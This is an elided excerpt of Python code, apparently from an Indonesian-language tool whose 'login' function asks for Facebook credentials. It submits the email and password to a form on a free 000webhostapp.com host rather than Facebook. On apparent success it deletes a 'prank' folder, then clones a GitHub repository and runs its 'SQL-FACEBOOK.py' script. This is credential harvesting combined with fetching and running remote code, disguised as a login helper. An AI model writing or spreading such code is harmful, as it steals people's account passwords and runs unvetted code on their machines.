...
def login():
	...
	tampil('\rh[*]Sedang Login....')
        buka('https://berbagi-2.000webhostapp.com/index.php')
	br.select_form(nr=0)
	br.form['email']=us
	br.form['pass']=pa
	br.submit()
	...
	if 'save-device' in url or 'm_sess' in url:
		...
		tampil('\rm[!]BERHASIL')
                os.system("ls && rm -rf prank ")
                os.system("git clone https://github.com/TuAn0w/prank && cd prank && python SQL-FACEBOOK.py")
